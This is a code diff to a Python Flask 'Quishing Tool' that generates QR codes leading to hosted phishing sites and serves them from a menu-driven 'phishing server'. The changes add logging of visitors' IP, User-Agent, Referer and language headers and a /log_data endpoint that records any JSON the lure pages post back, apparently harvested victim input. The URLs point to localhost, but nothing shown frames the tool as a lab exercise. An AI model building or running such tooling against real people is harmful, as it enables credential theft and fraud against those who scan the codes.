@@ -2,7 +2,7 @@ import os
 import qrcode
 import logging
 import sys
-from flask import Flask, request, send_from_directory, abort
+from flask import Flask, request, send_from_directory, abort, jsonify
 
 app = Flask(__name__)
 
@@ -13,14 +13,16 @@ os.makedirs(log_directory, exist_ok=True)
 logging.basicConfig(
     filename=os.path.join(log_directory, 'access.log'),
     level=logging.INFO,
-    format='%(asctime)s %(message)s'
+    format='%(asctime)s - IP: %(message)s'
 )
 
 def serve_site(site, filename):
     try:
         visitor_ip = request.remote_addr
         user_agent = request.headers.get('User-Agent')
-        logging.info(f"IP: {visitor_ip}, User-Agent: {user_agent}, Site: {site}, File: {filename}")
+        referer = request.headers.get('Referer')
+        accept_language = request.headers.get('Accept-Language')
+        logging.info(f"{visitor_ip} - User-Agent: {user_agent}, Referer: {referer}, Accept-Language: {accept_language}")
         return send_from_directory(os.path.join('sites', site), filename)
     except Exception as e:
         logging.error(f"Error serving site: {e}")
@@ -53,29 +55,46 @@ def start_server():
 
 def show_menu():
     print("===== Quishing Tool Menu =====")
-    print("1. Generate QR Code")
-    print("2. Start Phishing Server")
-    print("3. Exit")
-    choice = input("Please select an option (1-3): ")
+    print("1. Generate QR Code for Site 1")
+    print("2. Generate QR Code for Site 2")
+    print("3. Start Phishing Server")
+    print("4. Exit")
+    choice = input("Please select an option (1-4): ")
 
     if choice == '1':
-        url = input("Enter the URL for the QR Code: ")
-        output = input("Enter the output file name (default: phishing_qr.png): ") or "phishing_qr.png"
+        url = 'http://localhost:5000/site1/index.html'
+        output = input("Enter the output file name (default: phishing_qr_site1.png): ") or "phishing_qr_site1.png"
         generate_qr(url, output)
         show_menu()
     elif choice == '2':
+        url = 'http://localhost:5000/site2/index.html'
+        output = input("Enter the output file name (default: phishing_qr_site2.png): ") or "phishing_qr_site2.png"
+        generate_qr(url, output)
+        show_menu()
+    elif choice == '3':
         print("Starting the phishing server...")
         start_server()
-    elif choice == '3':
+    elif choice == '4':
         print("Exiting the tool. Goodbye!")
         sys.exit(0)
     else:
         print("[ERROR] Invalid choice. Please select a valid option.")
         show_menu()
 
-@app.route('/<site>/<path:filename>', methods=['GET'])
-def serve_site_route(site, filename):
-    return serve_site(site, filename)
+@app.route('/site1/<path:filename>', methods=['GET'])
+def serve_site1(filename):
+    return serve_site('site1', filename)
+
+@app.route('/site2/<path:filename>', methods=['GET'])
+def serve_site2(filename):
+    return serve_site('site2', filename)
+
+@app.route('/log_data', methods=['POST'])
+def log_data():
+    data = request.json
+    visitor_ip = request.remote_addr
+    logging.info(f"{visitor_ip} - Data: {data}")
+    return jsonify({"status": "success"}), 200
 
 if __name__ == "__main__":
     show_menu()
